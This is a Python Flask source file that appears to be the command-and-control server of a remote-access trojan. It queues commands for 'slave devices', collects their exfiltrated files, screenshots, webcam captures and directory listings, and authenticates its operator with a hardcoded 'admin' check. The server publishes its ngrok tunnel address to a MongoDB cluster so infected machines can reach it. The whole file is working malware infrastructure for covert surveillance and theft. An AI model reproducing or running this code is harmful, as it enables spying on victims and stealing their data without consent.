import numpy
import os
import json
from flask import *
from threading import Thread
import requests
import pymongo
from werkzeug.utils import secure_filename

api = Flask(__name__)

# this array includes the device name and the command code of the command to be executed
cmdArray = {'deviceName': '', 'command': 0, 'data': ''}

# this array contains the output of all console commands
shellArr = {'shell': ''}

# initiates mongodb
client = pymongo.MongoClient("mongodb+srv://{username}:{password}@cluster0.qajos.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
conn = client.main 
col = conn.server

# for screenshot and webcam pic
@api.route('/webcam-ss', methods=['POST'])
def ss():
  file = request.files['file']
  if file.filename != '':
    filename = secure_filename(file.filename)
    file.save(os.path.join(os.getcwd(), filename))
  else:
    return 'error'

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

# manages file browser commands and response
@api.route('/browse-files', methods=['POST'])
def browse_files():
  global shellArr

  req = request.data.decode("utf-8")
  final = numpy.asarray(json.loads(req)['data'])

  # appends new data
  shellArr['shell'] = str(final)

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

# saves the file that is sent by the client
@api.route('/save-file', methods=['POST'])
def save_file():

  # saves the received file locally 
  file = request.files['file']
  if file.filename != '':
    filename = secure_filename(file.filename)
    file.save(os.path.join(os.getcwd(), filename))
  else:
    return 'error'

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

# takes command from the master command center
@api.route('/command', methods=['POST'])
def cmd():
  req = request.data.decode("utf-8")

  # checks if master command center credentials are correct
  if str(json.loads(req)['admin']) == 'admin':
    if str(json.loads(req)['id']) == '1':

      # updates the array with command to be executed along with the command id
      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 1
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '2':

      # updates the array with command to be executed along with the command id
      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 2
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '3':

      # updates the array with command to be executed along with the command id
      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 3
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '4':

      # updates the array with command to be executed along with the command id
      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 4
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'
  else:
    return 'fail'

# this is used by slave devices to check if there are any commands to be executed
@api.route('/check', methods=['GET'])
def check():
  return jsonify(cmdArray)

# returns shell data
@api.route('/get-data', methods=['GET'])
def get_data():
  return jsonify(shellArr)

# adds client computer name to the database
@api.route('/add', methods=['POST'])
def add():
  req = request.data.decode("utf-8")
  col0 = conn.slave
  array = list(col0.find({'id': json.loads(req)['id']}))
  if str(array) == '[]':
    mydict = { "id": json.loads(req)['id'] }
    col0.insert_one(mydict)

  try:
    if array[0]['id'] == None:
      mydict = { "id": str(array[0]['id']) }
      mydict0 = {"$set": { "id": json.loads(req)['id'] } }
      col0.update_one(mydict, mydict0)
  except:
    pass

  else:
    mydict = { "id": str(array[0]['id']) }
    mydict0 = {"$set": { "id": json.loads(req)['id'] } }
    col0.update_one(mydict, mydict0)
  return 'success'

# initiates ngrok
def main():
  os.system('"ngrok http 3000 -host-header="localhost:3000" --log=stdout > ngrok.log &"')

# creates and updates new public url to mongodb
def mongo():
  # creates ngrok url
  def ngrok_url():
    url = "http://127.0.0.1:4040/api/tunnels"
    try:
      response = requests.get(url)
      url_new_https = response.json()["tunnels"][0]["public_url"]
      return str(url_new_https)
    except:
      ngrok_url()


  # updates mongodb cluster with new ngrok url
  array = list(col.find({'p63': 'p63'}))
  if str(array) == '[]':
    mydict = { 'p63': 'p63', "server": ngrok_url() }
    col.insert_one(mydict)

  try:
    if array[0]['server'] == None:
      mydict = { "server": str(array[0]['server']) }
      mydict0 = {"$set": { "server": ngrok_url() } }
      col.update_one(mydict, mydict0)
  except:
    pass

  else:
    mydict = { "server": str(array[0]['server']) }
    mydict0 = {"$set": { "server": ngrok_url() } }
    col.update_one(mydict, mydict0)

if __name__ == '__main__':
  Thread(target = main).start()
  mongo()
  api.run(host='localhost', port='3000')
